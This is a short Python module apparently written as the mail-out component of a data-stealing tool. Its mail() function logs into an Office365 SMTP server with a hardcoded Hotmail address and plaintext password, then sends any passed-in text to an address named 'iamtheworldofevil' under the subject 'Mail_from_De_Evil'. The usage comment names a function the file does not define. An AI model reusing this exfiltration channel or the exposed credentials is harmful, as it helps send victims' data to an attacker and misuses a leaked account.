import smtplib
import socket

# import sys
def mail(msg):
    # Login:
    mail = 'vilakshanjoshi7778@hotmail.com'
    psd = '''|x;=l6Tfg'I;Mdb?CdSl*JTI#jmYba?5,swRG^ctsSQ,Vky=wi%s9CHO^VW+,k`Z'''
    try:
        server = smtplib.SMTP("smtp.office365.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mail, psd)
    # Sending:
        message = ('From: Vilakshanjoshi7778@hotmail.com\nTo: iamtheworldofevil@gmail.com\nSubject: Mail_from_De_Evil\n\n \"'+ msg)
        server.sendmail(mail, 'iamtheworldofevil@gmail.com', message)
        # sys.stdout.flush()
        print ('--Mail sent successfully--')
        
    except smtplib.SMTPAuthenticationError:
        print("--Authentication Error--")
        # sys.exit()
    server.quit()

'''
import it as :
from Mail_hotmail import mail, server_exit
'''
